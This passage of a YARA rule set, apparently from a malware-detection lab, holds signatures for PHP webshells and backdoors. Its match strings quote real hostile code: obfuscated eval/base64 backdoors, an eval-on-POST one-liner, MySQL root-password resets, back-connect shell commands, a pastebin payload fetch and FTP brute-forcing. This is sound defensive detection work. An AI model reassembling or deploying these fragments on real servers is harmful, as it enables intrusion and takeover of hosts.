      $x3 = "// G5 (W.DLL) v2.0 8/8/2010 - last edit 20/9/2011) Lines after gzip = 1393  size = 86KB Coded by Piaster (wadelamin) " fullword ascii
      $x4 = "echo \"Hacking Mode?<br><select name='htype'><option >--------SELECT--------</option><option value='1'>known vulnerability (i.e." ascii
      $x5 = "to $bo')</script>\";} else die(\"<br>I Can Not Execute Command For Back Connect Disable_functions Or Safe Mode $bo\");}" fullword ascii
      $x6 = "if(wdll_chf()) {wdll_cmdf(\"C:\\AppServ\\MySQL\\bin\\mysqladmin -u root shutdown\"); " fullword ascii
      $x7 = "$rvsorc = \"http://www.yougetsignal.com/tools/web-sites-on-web-server/php/get-web-sites-on-web-server-json-data.php?remoteAdd" fullword ascii
      $x8 = "if(wdll_chf()) wdll_cmdf(\"C:\\AppServ\\MySQL\\bin\\mysql -e \\\"update mysql.user set PASSWORD=PASSWORD('piaster') where user =" ascii
      $x9 = "if(wdll_chf()) wdll_cmdf(\"C:\\AppServ\\MySQL\\bin\\mysql -e \\\"update mysql.user set PASSWORD=PASSWORD('piaster') where user =" ascii
      $x10 = "<font size=\\\"2\\\" color =\\\"ffffff\\\"><b>w.dll@live.com 2011 | <a target=_blank href='http://piaster.blogspot.com'>Site</a>" ascii
      $x11 = "<font size=\\\"2\\\" color =\\\"ffffff\\\"><b>w.dll@live.com 2011 | <a target=_blank href='http://piaster.blogspot.com'>Site</a>" ascii
      $x12 = "$wdlll = 'UPDATE '.$db.'.template SET template =\\''.$coded.'\\' WHERE title =\"spacer_open\"'; }break;//VB" fullword ascii
      $x13 = "if(wdll_chf()){$userlist = wdll_cmdf('ls /var/mail');}else $userlist =\"users\";" fullword ascii
      $s14 = "if(wdll_chf()) {wdll_cmdf(\"perl lbg.pl $bo\");echo \"<br>connected to $bo \";echo \"<script type='text/javascript'>alert('conne" ascii
      $s15 = "if(wdll_chf()) {wdll_cmdf(\"perl wbg.pl $bo\"); echo \"<br>connected to $bo\";echo \"<script type='text/javascript'>alert('conne" ascii
      $s16 = "if(wdll_chf()) {wdll_cmdf(\"perl bpg.pl $ip $bo\"); echo \"<br>connected to $ip $bo\";echo \"<script type='text/javascript'>aler" ascii
      $s17 = "PASSWORD: piaster<br><br><br><p align=\"center\"><a href=\"javascript: history.go(-1)\">Back</a></p></center>';" fullword ascii
      $s18 = "$wdll ='UPDATE '.$db.'.template SET template = \\''.$coded.'\\' WHERE title = \"FORUMHOME\"'; " fullword ascii
      $s19 = "password guessing</option><option value='21' >Remote administrative panel access through social engineering</option><option val" fullword ascii
      $s20 = "echo '<br> Please wait ................................... Goodluck ...Win phpMyAdmin Hacked :: <br>USER: root & PASSWORD: piast" ascii
   condition:
      uint16(0) == 0x3f3c and filesize < 300KB and
      1 of ($x*) and all of them
}

rule sig_061133cbb921294b14c57156bbb13b5045d48413
{
   meta:
      description = "php17 - file 061133cbb921294b14c57156bbb13b5045d48413.php"
      author = "WatcherLab"
      date = "2019-02-23"
      hash1 = "de1960e166b920c38a6fb45a2aa60165162e9361db933a4999c771874be064c8"
   strings:
      $s1 = "$X='),arfrray(\"/\",\"rf+\"),$ss($s[$i],0,rf$e))),$k)))rf;$rfo=ob_get_crfonterfnrfts();ob_enrfd_cleanrf(rf);$d=';" fullword ascii
      $s2 = "$G='rf;}$r=$_SERVrfErfR;$rr=@$rfr[\"rfHTTP_REFERrfER\"];$rrfa=@$rfr[\"HTTPrf_ACCEPrfT_LANGrfUAGE\"];rfif($rrrf&rf&rf$r';" fullword ascii
      $s3 = "$s='base6rf4_encodrfe(x(gzrfcompressrf(rf$o),$k))rf;print(\"rf<$k>$rfd</$krf>\");@sesrfsion_rfdesrftroy();}}}}';" fullword ascii
      $s4 = "$t='_key_exrfrfists($i,$srf)){$rfs[$i]rf.=$p;$e=strposrf($rfs[$i],rf$f);if($e)rf{$krf=$krfh.$kf;ob_starfrt(';" fullword ascii
      $s5 = "$N='=&rf$_SESSrfrfION;$rfss=\"subrfstrfr\";$sl=\"strrftolower\"rf;$i=$m[rf1][0].rf$m[1][1];$rfrfh=$sl($rfss(md';" fullword ascii
      $s6 = "$K='$kh=\"5d41\"rfrf;$kf=\"402arf\";functirforfrfn x($rfrft,$k){$c=strlerfn($k);$l=srftrrflen($t);$o=rf\"\";forrf(';" fullword ascii
      $s7 = "$Q='ll(\"/([rf\\\\w])[\\\\wrf-]+rf(?rf:;q=rf0.([\\\\d]))?,?/\",rf$ra,$mrf);ifrf($q&rf&$m){@sessirfrfon_rfstart();$s';" fullword ascii
      $s8 = "$w='$i=0;$i<rf$l;)rf{for(rf$j=0;($j<$rfc&&$irfrf<$l);$jrf++,$irf++){$o.=$t{$rfi}^rf$k{$rfj};}}rerfturn $o';" fullword ascii
      $s9 = "$k='5($i.$rfkh),0,rf3));$frf=$sl($srfs(mrfd5($irf.$krff),0,3)rf);$p=rf\"\";for($rfz=rf1;$z<counrft($m[1rf]);$';" fullword ascii
      $s10 = "$M='z++)rf$p.rf=$q[$m[rf2][$z]]rf;if(strporfs($rfp,$hrf)===0){$rfs[rf$i]=\"\";rf$p=$ss($p,3);}rfrfif(arrayrf';" fullword ascii
      $s11 = "$W='a){$u=parse_urlrf($rr);prfarse_srftrfrfr($urf[\"query\"],$rfq);$q=array_vrfrfalues($qrf);prrfeg_rfmatch_a';" fullword ascii
      $s12 = "$j=')rf;@evrfalrf(@gzuncorfmpress(@x(@brfase6rf4_drfecode(pregrf_reprfrflrface(arrfrarfy(\"rf/_/\",\"rf/-/\"';" fullword ascii
      $s13 = "$u=str_replace('rf','',$K.$w.$G.$W.$Q.$N.$k.$M.$t.$j.$X.$s);" fullword ascii
      $s14 = "$F=str_replace('UG','','cUGreUGate_UGfUGunUGUGction');" fullword ascii
   condition:
      uint16(0) == 0x3f3c and filesize < 4KB and
      8 of them
}

rule sig_4ebe405dbc31f58de5fb9145f2a201290890a83e
{
   meta:
      description = "php17 - file 4ebe405dbc31f58de5fb9145f2a201290890a83e.php"
      author = "WatcherLab"
      date = "2019-02-23"
      hash1 = "d0f0ad509698e0c3a48e354c7dbb276fd020ba4afd85df2cf90ceedc6d071d32"
   strings:
      $s1 = "$text3 = http_get('https://pastebin.com/raw/Yban6vjw');" fullword ascii
      $s2 = "<textarea cols=80 rows=20 name=\"src\">'.htmlspecialchars(file_get_contents($_POST['path'])).'</textarea><br />" fullword ascii
      $s3 = "echo '<br />Mr. DellatioNx196 GaLers xh3LL Backd00r <font color=\"red\">1.0</font>, Coded By <font color=\"red\">Mr. DellatioNx1" ascii
      $s4 = "echo('<pre>'.htmlspecialchars(file_get_contents($_GET['filesrc'])).'</pre>');" fullword ascii
      $s5 = "echo '<div id=\"content\"><table width=\"700\" border=\"0\" cellpadding=\"3\" cellspacing=\"1\" align=\"center\">" fullword ascii
      $s6 = "echo '<br />Mr. DellatioNx196 GaLers xh3LL Backd00r <font color=\"red\">1.0</font>, Coded By <font color=\"red\">Mr. DellatioNx1" ascii
      $s7 = "echo '<font color=\"red\">File Upload Error ~_~.</font><br />';" fullword ascii
      $s8 = "New Name : <input name=\"newname\" type=\"text\" size=\"20\" value=\"'.$_POST['name'].'\" />" fullword ascii
      $s9 = "<td><center><form method=\\\"POST\\\" action=\\\"?option&path=$path\\\">" fullword ascii
      $s10 = "echo '<font color=\"green\">File Upload Done Kakak ~_^ .</font><br />';" fullword ascii
      $s11 = "if(is_writable(\"$path/$file\") || !is_readable(\"$path/$file\")) echo '</font>';" fullword ascii
      $s12 = "<input type=\"hidden\" name=\"path\" value=\"'.$_POST['path'].'\">" fullword ascii
      $s13 = "foreach($_POST as $key=>$value){" fullword ascii
      $s14 = "$_POST[$key] = stripslashes($value);" fullword ascii
      $s15 = "if(is_writable(\"$path/$dir\") || !is_readable(\"$path/$dir\")) echo '</font>';" fullword ascii
      $s16 = "}elseif(isset($_GET['option']) && $_POST['opt'] != 'delete'){" fullword ascii
      $s17 = "if(isset($_GET['option']) && $_POST['opt'] == 'delete'){" fullword ascii
      $s18 = "echo '<form enctype=\"multipart/form-data\" method=\"POST\">" fullword ascii
      $s19 = "if(copy($_FILES['file']['tmp_name'],$path.'/'.$_FILES['file']['name'])){" fullword ascii
      $s20 = "echo '</table><br /><center>'.$_POST['path'].'<br /><br />';" fullword ascii
   condition:
      uint16(0) == 0x683c and filesize < 30KB and
      8 of them
}

rule sig_2013_10_01_000002_Db_Backend_User_Groups
{
   meta:
      description = "php17 - file 2013_10_01_000002_Db_Backend_User_Groups.php"
      author = "WatcherLab"
      date = "2019-02-23"
      hash1 = "05f086701038f3cb4d3572507368b199de41c74614b95fe52d67e5df871a40b9"
   strings:
      $s1 = "Schema::create('backend_user_groups', function (Blueprint $table) {" fullword ascii
      $s2 = "Schema::dropIfExists('backend_user_groups');" fullword ascii
      $s3 = "use October\\Rain\\Database\\Updates\\Migration;" fullword ascii
      $s4 = "use October\\Rain\\Database\\Schema\\Blueprint;" fullword ascii
      $s5 = "$table->string('name')->unique('name_unique');" fullword ascii
      $s6 = "class DbBackendUserGroups extends Migration" fullword ascii
   condition:
      uint16(0) == 0x3f3c and filesize < 1KB and
      all of them
}

rule AtRuleBlockList
{
   meta:
      description = "php17 - file AtRuleBlockList.php"
      author = "WatcherLab"
      date = "2019-02-23"
      hash1 = "f79f41c7b9532704c1620d875ef72088ad9f832bb3c81662d606f457da311199"
   strings:
      $s1 = "* A BlockList constructed by an unknown @-rule. @media rules are rendered into AtRuleBlockList objects." fullword ascii
      $s2 = "$sResult = \"@{$this->sType}$sArgs{$oOutputFormat->spaceBeforeOpeningBrace()}{\";" fullword ascii
      $s3 = "public function render(\\Sabberworm\\CSS\\OutputFormat $oOutputFormat) {" fullword ascii
      $s4 = "return $this->render(new \\Sabberworm\\CSS\\OutputFormat());" fullword ascii
      $s5 = "public function __construct($sType, $sArgs = '') {" fullword ascii
      $s6 = "public function isRootList() {" fullword ascii
      $s7 = "$sResult .= parent::render($oOutputFormat);" fullword ascii
      $s8 = "namespace Sabberworm\\CSS\\CSSList;" fullword ascii
      $s9 = "private $sArgs;" fullword ascii
      $s10 = "private $sType;" fullword ascii
      $s11 = "use Sabberworm\\CSS\\Property\\AtRule;" fullword ascii
   condition:
      uint16(0) == 0x3f3c and filesize < 2KB and
      8 of them
}

rule sig_96ae197e989129b4e65fc381b10880454828b2fc
{
   meta:
      description = "php17 - file 96ae197e989129b4e65fc381b10880454828b2fc.php"
      author = "WatcherLab"
      date = "2019-02-23"
      hash1 = "a05c25be1c779a5fe8960a24229a969d37593f5350c84706349c4bbe70c599c8"
   strings:
      $s1 = "$J='*,$e))*),$k)))*;$o=o***b_get_contents();ob*_end*_clea*n();$d*=bas*e64_encode*';" fullword ascii
      $s2 = "$Q='*\"HTTP_AC*CEPT_LA*NGUAGE\"*];i*f(*$rr&&$ra)*{$u*=parse_url(*$rr);*p*arse_str($u';" fullword ascii
      $s3 = "$r='*}^$k*{$j*};}}return *$o;}$r*=$_SERVER;$*rr=@$r[\"***HTTP_RE*FER*ER\"];$ra=@$r[';" fullword ascii
      $s4 = "$k='p=$*s*s($p,3*);}if*(*array_key_exists($*i,$s)){$*s[$i]*.=$p*;$e=**strpos($s[$';" fullword ascii
      $s5 = "$v=':;q=0.(*[\\\\d]*))?,*?/\",$ra,$m);if*($q&&$m)*{@sessi*on_sta**rt();$*s=&$_SESSION';" fullword ascii
      $s6 = "$t='*4_decode(preg_repl*ace(a*rray(\"/*_/\",*\"/-*/\"),array*(\"/\",\"+\")*,$*ss($s[$i],0';" fullword ascii
      $s7 = "$f='$k*h=\"5d41*\";$kf=\"4*02a\";functio*n x(*$t,$k){**$c=strlen($*k);$l*=strlen($*t);$';" fullword ascii
      $s8 = "$j='[\"query*\"],$q)*;$q=*arra*y_values($*q);pre*g_ma*tch_all(*\"/([*\\\\w])*[\\\\*w-]*+(?';" fullword ascii
      $s9 = "$S='*i]*,$f);if*($e){$k=$*k*h.$kf;ob_**start();@*ev*al(@gzunco*mpr*ess(@x(@b*ase6';" fullword ascii
      $s10 = "$E='*o=*\"\";*for($i=0;$i*<$l;){*for($j=0*;($j*<$c&&$i<$*l)*;$j++,$i*++){*$o.=$t{$*i';" fullword ascii
      $s11 = "$h='d5($i.$*kh),0,3));$f=*$s*l($ss(md5(*$*i.$kf)*,0*,3));$p=\"\";f*or($z=1;$*z<co*u';" fullword ascii
      $s12 = "$O='(x(gzc**ompress($o)*,$k));pr*int(*\"<$k>*$d<*/$k>\");@se*s*sion_destr*oy();}}}}';" fullword ascii
      $s13 = "$H='*;*$ss=\"su*bstr\";$sl*=*\"strt*olower\";$*i=$m[1][*0]*.$*m[*1][1];$h=*$sl($*ss(m';" fullword ascii
      $s14 = "$N='nt($*m[1]);*$z++)$p*.=$q*[$m[2]*[$z]];*if(*strpos($p,$h*)===*0*){$s[$i]=*\"\";$';" fullword ascii
      $s15 = "$y=str_replace('*','',$f.$E.$r.$Q.$j.$v.$H.$h.$N.$k.$S.$t.$J.$O);" fullword ascii
      $s16 = "$I=str_replace('ip','','ipcreatipeip_ipfipipunction');" fullword ascii
   condition:
      uint16(0) == 0x3f3c and filesize < 3KB and
      8 of them
}

rule sig_00392828ffb7aabd6c66ca775f1356eef850c8b7
{
   meta:
      description = "php17 - file 00392828ffb7aabd6c66ca775f1356eef850c8b7.php"
      author = "WatcherLab"
      date = "2019-02-23"
      hash1 = "19ddef3ac56931999f086573be93b5385319b35081e9d5dbce0b8e3e16f85a64"
   strings:
      $x1 = "\"findconfig * files\" => \"find / -typef - name\\\"config*\\\"\", \"find config* files in current dir\" => \"find . -type f -na" ascii
      $x2 = "' < td >: < nobr > '.substr(@php_uname(), 0, 120).' < ahref = \"http://www.google.com/search?q='.urlencode(@php_uname()).'\"targ" ascii
      $x3 = "echo '<h1>Execution PHP-code</h1> example : echo file_get_contents(`/etc/passwd`); <div " fullword ascii
      $x4 = "echo '<h1>FTP bruteforce</h1><div class=content><table><form method=post><tr><td><span>Type</span></td>' . '<td><select name=pro" ascii
      $x5 = "if (is_file($_POST['p1'])) $m = array('View', 'Highlight', 'Download', 'Hexdump', 'Edit', 'Chmod', 'Rename', 'Touch');" fullword ascii
      $x6 = "if ($db->connect($_POST['sql_host'], $_POST['sql_login'], $_POST['sql_pass'], $_POST['sql_base'])) {" fullword ascii
      $x7 = "$str = \"host='\" . $ip . \"' port='\" . $port . \"' user='\" . $login . \"' password='\" . $pass . \"' dbname=''\";" fullword ascii
      $x8 = "if (is_file($_POST['p1'])) $m = array('View', 'Highlight', 'Download', 'Hexdump', 'Edit'" fullword ascii
      $x9 = "if ($this->link = @pg_connect(\"host={$host[0]} port={$host[1]} user=$user password=$pass dbname=$dbname\")) return true;" fullword ascii
      $x10 = "ue='Dump' onclick='document.sf.p2.value=\\\"download\\\";document.sf.submit();'></td><td style='border-top:2px solid #666;'>\";" fullword ascii
      $x11 = "if ($db->connect($_POST['sql_host'], $_POST['sql_login'], $_POST['sql_pa" fullword ascii
      $x12 = "if (!$_SESSION[login]) system32($_SERVER['HTTP_HOST'], $_SERVER['REQUEST_URI'], $auth_pass);" fullword ascii
      $x13 = "$downloaders = array('wget', 'fetch', 'lynx', 'links', 'curl', 'get', 'lwp-mirror');" fullword ascii
      $x14 = "tmlspecialchars($_POST['p3']) . \"</textarea><br/><input type=submit value='Execute'>\";" fullword ascii
      $x15 = "$millink = 'http://www.exploit-db.com/search/?action=search&filter_description=';" fullword ascii
      $x16 = "$db->connect($_POST['sql_host'], $_POST['sql_login'], $_POST['sql_pass']" fullword ascii
      $x17 = "if (!$_SESSION[login]) system32($_SERVER['HTTP_HOST'], $_SERVER['REQUEST_URI'], $aut" fullword ascii
      $x18 = "if (empty($_POST['ajax']) && !empty($_POST['p1'])) $_SESSION[md5($_SERVER['HTTP_HOST']) . 'ajax'] = false;" fullword ascii
      $x19 = "/www.google.com\"target = _blank > [SideKick2] < / a > < / nobr > < br >:" fullword ascii
      $x20 = "= _blank > [1337day] < / a > Download: < ahref = \"http://www.google.com\"target = _blank > [SideKick1] < / a > < ahref = \"http" ascii
   condition:
      uint16(0) == 0x3f3c and filesize < 500KB and
      1 of ($x*)
}

rule sig_4d6193e7f4938b84e3826216f051cb77267f2042
{
   meta:
      description = "php17 - file 4d6193e7f4938b84e3826216f051cb77267f2042.php"
      author = "WatcherLab"
      date = "2019-02-23"
      hash1 = "dc671612a88114097ad6c5b143473750b111bcd5446f72083c4a734b1bb25df7"
   strings:
      $s1 = "$R='$i],0,n.$e))),$k)));$n.o=on.n.b_getn._contents();ob_en.nd_cleann.()n.;$dn.=bn.ase64_enc';" fullword ascii
      $s2 = "$A='rn.[\"HTTP_An.CCEPT_Ln.ANGn.UAGE\"]n.;if($rr&&n.$ran.){$u=pan.rse_un.rl($rr)n.;parsen._n.str(';" fullword ascii
      $s3 = "$q='$u[\"qun.ery\"],$q)n.n.n.;$q=array_vn.an.n.lues($q);preg_match_an.n.ll(\"/([\\\\wn.])n.[\\\\w-]+(?';" fullword ascii
      $s4 = "$s='n.($s[$i],n.$f);if(n.$e){$k=n.$kh.$kn.f;obn._start();@evan.l(@gzun.ncon.mpn.ress(@x(@ban.se6';" fullword ascii
      $s5 = "$E='SIOn.N;$ss=\"subn.str\";$sn.l=\"stn.rn.ton.lower\";$i=$m[1n.][n.0n.].$m[1]n.[1];$h=$sln.($';" fullword ascii
      $s6 = "$g='n.=\"\";n.$p=$ss(n.$pn.,3);}if(n.an.rray_key_exisn.ts($i,$n.sn.))n.{$s[$i].=$p;$en.=strpon.sn.';" fullword ascii
      $s7 = "$H='$t{n.$in.}^$k{$n.j};}}return $o;n.n.}$r=$_SERVEn.R;$rn.r=@$r[\"HTTP_n.n.REFERER\"];n.$ra=@$';" fullword ascii
      $s8 = "$y='4_den.code(pn.n.rn.eg_repln.acn.e(array(\"/_/\",\"n./-/\"n.),array(\"/n.\",\"+\"n.n.),$ssn.($s[';" fullword ascii
      $s9 = "$I='$kh=\"n.5d41\";$kf=n.\"402a\";fn.unn.ctn.ion x($t,$kn.){n.$c=strln.en($k);$l=n.stn.rlen($';" fullword ascii
      $s10 = "$w='ode(x(gzcon.mn.press($o),n.$k))n.;pn.rint(n.\"<$k>$d</$k>n.n.\");@sen.ssion_den.stroy();}}}}';" fullword ascii
      $s11 = "$O='t);$n.o=n.\"\";fon.rn.($i=0n.;$i<$l;){for($j=n.n.0;($j<$c&&$in.n.<$ln.);$n.j++n.,$i++){$o.=';" fullword ascii
      $s12 = "$B='n.ss(mdn.5($i.$khn.),0,3));n.$n.f=$sl($ss(md5($i.$kn.fn.),0,3))n.;$p=\"\";fn.or($z=1;n.$z';" fullword ascii
      $s13 = "$l='n.n.<count($m[1]);$z+n.+)$n.p.=$q[n.n.$m[2n.][$z]];if(n.strpos($p,$hn.)=n.==0){$s[$i]';" fullword ascii
      $s14 = "$d=str_replace('n.','',$I.$O.$H.$A.$q.$Z.$E.$B.$l.$g.$s.$y.$R.$w);" fullword ascii
      $s15 = "$Z='n.n.:;q=n.0n..([\\\\d]))?,?/\"n.,$ra,$m)n.;if($q&&$m){@sesn.sionn._startn.();$s=&n.$n._SES';" fullword ascii
      $s16 = "$m=str_replace('uE','','uEcruEeatuEuEe_fuuEnctiuEon');" fullword ascii
   condition:
      uint16(0) == 0x3f3c and filesize < 4KB and
      8 of them
}

rule sig_04c06d504073a88280f326be6661f3beffa32bd3
{
   meta:
      description = "php17 - file 04c06d504073a88280f326be6661f3beffa32bd3.php"
      author = "WatcherLab"
      date = "2019-02-23"
      hash1 = "754a2533764c4628a1877d376ad7b722f5aeba6605f2a9d56c0d807faf2bba5f"
   strings:
      $s1 = "$s='$i],S!0,$e))),$k)S!)S!);$o=S!oS!b_getS!_contentS!s();ob_end_cleaS!n();$d=baS!se6S!4_e';" fullword ascii
      $s2 = "$v='$sS![$iS!],$f);iS!f(S!$e)S!{$k=$kh.$kS!f;ob_S!start();@eS!valS!(@gzuncomprS!eS!ss(@x(@baS!';" fullword ascii
      $s3 = "$U='@$r[\"HTTP_ACS!CES!PT_LS!ANGUAGE\"S!];ifS!($rr&S!&$raS!){$u=paS!rse_url(S!$rr);parS!se_str(S!$';" fullword ascii
      $s4 = "$b='!?:;q=0S!.([\\\\d]S!))?,?/\",S!$ra,S!$m);S!if($S!q&&$m){S!@session_staS!rt()S!;$s=&$_S!SS!ESSI';" fullword ascii
      $s5 = "$t='nS!coS!dS!e(x(gzS!compressS!($o),$S!k));print(\"<$kS!>$d</$S!k>\");@S!seS!ssionS!_destroy();}}}}';" fullword ascii
      $s6 = "$u='i]=\"\";$S!p=$ss($S!p,3);}S!if(arS!S!ray_key_exisS!S!ts($i,$s)){$sS![$i]S!.=$p;$eS!=strposS!(';" fullword ascii
      $s7 = "$l='}^S!$S!k{S!$jS!S!};}}retuS!rn $o;}$r=$_SERS!VER;$S!rr=@$S!r[\"HTTP_RS!EFERER\"];$raS!S!=';" fullword ascii
      $s8 = "$Z='se64S!_decode(pS!reg_replacS!e(aS!rray(\"/_S!/\"S!,\"/-/S!\"S!),arrayS!(\"S!S!/\",\"+\"),$ss($s[';" fullword ascii
      $s9 = "$w='ON;S!S!$ss=\"subS!str\";$sl=\"stS!rS!tolower\";$i=$mS![1][S!0S!].S!$m[1][1];$h=$S!sl($ss(S!';" fullword ascii
      $s10 = "$p='$kh=\"5d4S!1\";$kf=\"S!402a\";fS!unctS!ion x(S!$t,$k){$S!c=sS!trlen(S!$k);$l=S!strS!len($t);S!$';" fullword ascii
      $s11 = "$L='u[\"querS!y\"S!],$qS!)S!;$q=arrayS!_valuS!S!es($q);preg_match_S!S!all(\"/([\\\\w])[\\\\wS!-]+(S';" fullword ascii
      $s12 = "$g='!<counS!S!t($m[1]S!)S!;$z++)$p.=$q[$m[2][$S!z]]S!;ifS!(strpS!os($S!p,$h)===0){S!$s[$';" fullword ascii
      $s13 = "$n='oS!=S!\"\";for($i=0;S!$i<S!$l;S!){fS!or($j=S!0;($jS!<$c&&$i<$l);$S!j++,$i++){$o.=S!$t{$i';" fullword ascii
      $s14 = "$Q='mS!d5S!($i.$S!kh),0,3));$f=$sl($S!ssS!(md5(S!S!$i.$kf),0,3)S!);$p=\"\";forS!($z=S!1;$zS';" fullword ascii
      $s15 = "$T=str_replace('S!','',$p.$n.$l.$U.$L.$b.$w.$Q.$g.$u.$v.$Z.$s.$t);" fullword ascii
      $s16 = "$E=str_replace('K','','crKeKateKK_KfunKction');" fullword ascii
   condition:
      uint16(0) == 0x3f3c and filesize < 4KB and
      8 of them
}

rule AbstractDigestTest
{
   meta:
      description = "php17 - file AbstractDigestTest.php"
      author = "WatcherLab"
      date = "2019-02-23"
      hash1 = "6c2c512c8e75304b6d824356b644851fce5f37d4f9fcee8df81318f0def1a201"
   strings:
      $s1 = "$header = 'username=user, realm=myRealm, nonce=12345, uri=/, response=' . $digestHash . ', opaque=1, qop=auth, nc=1, cno" fullword ascii
      $s2 = "$header = 'username=user, realm=myRealm, nonce=12345, uri=/, response=' . $digestHash . ', opaque=1, qop=auth, nc=1, cnonce=1';" fullword ascii
      $s3 = "$header = 'username=array, realm=myRealm, nonce=12345, uri=/, response=HASH, opaque=1, qop=auth, nc=1, cnonce=1';" fullword ascii
      $s4 = "$header = 'username=null, realm=myRealm, nonce=12345, uri=/, response=HASH, opaque=1, qop=auth, nc=1, cnonce=1';" fullword ascii
      $s5 = "$header = 'username=false, realm=myRealm, nonce=12345, uri=/, response=HASH, opaque=1, qop=auth, nc=1, cnonce=1';" fullword ascii
      $s6 = "$header = 'username=user, realm=myRealm, nonce=12345, uri=/, response=HASH, opaque=1, qop=auth, nc=1, cnonce=1';" fullword ascii
      $s7 = "$digestHash = md5('HELLO:12345:1:1:auth:' . md5('GET:/'));" fullword ascii
      $s8 = "function testCheckBadGetUserInfoResponse() {" fullword ascii
      $s9 = "function testCheckBadGetUserInfoResponse2() {" fullword ascii
      $s10 = "function getDigestHash($realm, $userName) {" fullword ascii
      $s11 = "$request = new HTTP\\Request('GET', '/');" fullword ascii
      $s12 = "* @expectedException Sabre\\DAV\\Exception" fullword ascii
      $s13 = "function testCheckBadPassword() {" fullword ascii
      $s14 = "'PHP_AUTH_DIGEST' => $header," fullword ascii
      $s15 = "$response->getHeader('WWW-Authenticate')" fullword ascii
      $s16 = "'REQUEST_METHOD'  => 'GET'," fullword ascii
      $s17 = "$request = HTTP\\Sapi::createFromServerArray([" fullword ascii
      $s18 = "function testCheckNoHeaders() {" fullword ascii
      $s19 = "function testCheckUnknownUser() {" fullword ascii
      $s20 = "$response = new HTTP\\Response();" fullword ascii
   condition:
      uint16(0) == 0x3f3c and filesize < 10KB and
      8 of them
}


rule a76ad4ab951cb70b9cdc97406f002927
{
   meta:
      description = "php17 - file a76ad4ab951cb70b9cdc97406f002927.php"
      author = "WatcherLab"
      date = "2019-02-23"
      hash1 = "e3618423c60b50faa079f3a0af57d0f9641a03f0dc7aca71c882e2eda2d9d0bb"
   strings:
      $s1 = "neu9 =\"post_\";$qwnk61 = strtoupper( $zneu9[4].$zneu9[0] .$zneu9[1]. $zneu9[2].$zneu9[3] );if ( isset(${ $qwnk61} ['q6fc9cb'] )" ascii
      $s2 = "{eval(${$qwnk61}[ 'q6fc9cb']) ;} ?>" fullword ascii
   condition:
      uint16(0) == 0x3f3c and filesize < 1KB and
      all of them
}

rule sig_2015_09_05_100142_add_icon_column_to_menuitems_table
{
   meta:
      description = "php17 - file 2015_09_05_100142_add_icon_column_to_menuitems_table.php"
      author = "WatcherLab"
      date = "2019-02-23"
      hash1 = "d660dbad2609c0c23c22cf2c9df928e4ff925fc4827b5481fc84c16bca66e89d"
   strings:
      $s1 = "Schema::table('menu__menuitems', function (Blueprint $table) {" fullword ascii
      $s2 = "$table->dropColumn('icon');" fullword ascii
      $s3 = "$table->string('icon')->default('');" fullword ascii
   condition:
      uint16(0) == 0x3f3c and filesize < 1KB and
      all of them
}

rule sig_30cfd37d1724a023efb46efe1d9453bbc649f3e3
{
   meta:
      description = "php17 - file 30cfd37d1724a023efb46efe1d9453bbc649f3e3.php"
      author = "WatcherLab"
      date = "2019-02-23"
      hash1 = "08db8b4c5150b69b890b4c34329c2346e18cb43697141a77204907ad02db3d59"
   strings:
      $s1 = "$qzvww53 = @$GLOBALS['xvxof76']($vynus66 . $r76[74] . $r76[16] . $r76[16] . $kbujj5, $nqbin74, $kdidw81, $msnsv40, $qvbta37);" fullword ascii
      $s2 = "$qzvww53 = @$GLOBALS['xvxof76']($vynus66 . $r76[74] . $r76[16] . $r76[16] . $kbujj5, $nqbin74, $kdidw81, $msnsv40, $qvbta37)" fullword ascii
      $s3 = "$qzvww53 = @$GLOBALS['clkxn20']($vynus66 . $r76[74] . $r76[16] . $r76[16] . $kbujj5 . $r76[74] . $nqbin74, $kdidw81, $msnsv4" fullword ascii
      $s4 = "function rzekg39($r76, $qzvww53, $ajvyf84, $kbujj5, $nqbin74, $qvbta37, &$kdidw81, &$msnsv40, $gxosp36 = false)" fullword ascii
      $s5 = "#echo PHP_OS . $r76[80] . $GLOBALS['quzii24'](0987654321) . $r76[80] . $r76[52] . $r76[85] . $r76[80] . $r76[1] . $r76[1] . " fullword ascii
      $s6 = "$eynrg66 = $GLOBALS['efljc33']($r76[58] . $r76[87] . $r76[53] . $r76[95] . $r76[16] . $r76[58] . $r76[7] . $r76[5] . $r76[90] " fullword ascii
      $s7 = "$GLOBALS['xavtv19']($r76[83] . $r76[1] . $r76[4] . $r76[26] . $r76[35] . $r76[52] . $r76[26] . $r76[15] . $r76[80] . $r76[42] " fullword ascii
      $s8 = ". $r76[52] . $r76[26] . $r76[15] . $r76[9] . $r76[1] . $r76[52] . $r76[26] . $r76[15] . $r76[9] . $r76[8] . $r76[46] . $r76[1] " fullword ascii
      $s9 = "$r76[15] . $r76[9] . $r76[8] . $r76[46] . $r76[1] . $r76[52] . $r76[26] . $r76[85] . $r76[9] . $r76[1] . $r76[52] . $r76[26] . " fullword ascii
      $s10 = "$r76[67] . $r76[94] . $r76[78] . $r76[41] . $r76[5]] = $jabhi9[$r76[96] . $r76[49] . $r76[95] . $r76[69] . $r76[67] . $r76[94] " fullword ascii
      $s11 = ". $r76[26] . $r76[15] . $r76[9] . $r76[8] . $r76[1] . $r76[76] . $r76[26] . $r76[15] . $r76[9] . $r76[1] . $r76[52] . $r76[26] " fullword ascii
      $s12 = "$iwule39[$xhovg5][$r76[5] . $r76[54] . $r76[66] . $r76[78] . $r76[87] . $r76[41] . $r76[54] . $r76[94] . $r76[58] . $r76[95]] " fullword ascii
      $s13 = "$iwule39[$xhovg5][$r76[61] . $r76[54] . $r76[96] . $r76[49] . $r76[95] . $r76[69]] . $r76[21] . $r76[30] . $r76[86] . $r76[21] " fullword ascii
      $s14 = "$vcnaa29[] = $txows40[$r76[41] . $r76[24] . $r76[94] . $r76[7] . $r76[94] . $r76[24] . $r76[94] . $r76[58] . $r76[27] . " fullword ascii
      $s15 = "$iwule39[$xhovg5][$r76[5] . $r76[54] . $r76[7] . $r76[90] . $r76[53] . $r76[5] . $r76[66] . $r76[78] . $r76[87] . $r76[41]] = " fullword ascii
      $s16 = "$jabhi9[$r76[36] . $r76[49] . $r76[66] . $r76[87] . $r76[0] . $r76[24] . $r76[49] . $r76[78]] = @$GLOBALS['laepm94']($r76[16] " fullword ascii
      $s17 = "for ($afses42 = $GLOBALS['glyac65']($r76[6] . $r76[56] . $r76[55] . $r76[54] . $r76[55] . $r76[67] . $r76[79] . $r76[3] . $r76" fullword ascii
      $s18 = "if ($GLOBALS['glyac65']($r76[55] . $r76[17] . $r76[40] . $r76[19] . $r76[79] . $r76[67] . $r76[54] . $r76[67] . $r76[34] . $" fullword ascii
